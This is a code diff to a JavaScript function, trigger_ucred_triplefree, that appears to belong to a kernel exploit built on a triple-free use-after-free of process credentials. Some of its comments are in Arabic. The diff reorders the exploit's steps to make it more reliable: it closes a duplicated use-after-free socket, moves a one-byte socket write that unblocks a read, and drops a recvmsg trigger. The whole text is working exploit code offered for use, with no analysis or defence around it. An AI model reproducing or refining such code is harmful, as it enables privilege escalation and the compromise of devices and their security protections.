@@ -1357,7 +1357,8 @@ function trigger_ucred_triplefree() {
     send_notification("[STEP 11] Setting master triplet from twins=" + twins[0]);
     triplets[0] = twins[0];
     send_notification("[STEP 11] triplets[0] = " + triplets[0]);
-
+    
+    close(dup(new BigInt(uaf_socket)));
     // STEP 12 — إيجاد التريبلت الأول
     send_notification("[STEP 12] Calling find_triplet(master=" + triplets[0] + ", skip=-1)");
     triplets[1] = twins[0];
@@ -1370,6 +1371,8 @@ function trigger_ucred_triplefree() {
     }
 
     send_notification("[STEP 12] triplet1 FOUND OK");
+    send_notification("[STEP 13] Sending 1 byte to iov_sock_1 to unblock read...");
+    write(new BigInt(iov_sock_1), tmp, 1);
 
     // STEP 13 — إيجاد التريبلت الثاني
     send_notification("[STEP 13] Calling find_triplet(master=" + triplets[0] + ", skip=" + triplets[1] + ")");
@@ -1390,9 +1393,7 @@ function trigger_ucred_triplefree() {
     send_notification("[STEP 14] final close DONE");
 
     // STEP 15 — قراءة بعد الفلو
-    trigger_iov_recvmsg();
-    send_notification("[STEP 15] Sending 1 byte to iov_sock_1 to unblock read...");
-    write(new BigInt(iov_sock_1), tmp, 1);
+   
     send_notification("[STEP 15] Waiting for iov_recvmsg...");
     wait_iov_recvmsg();
     send_notification("[STEP 15] Reading from iov_sock_0...");
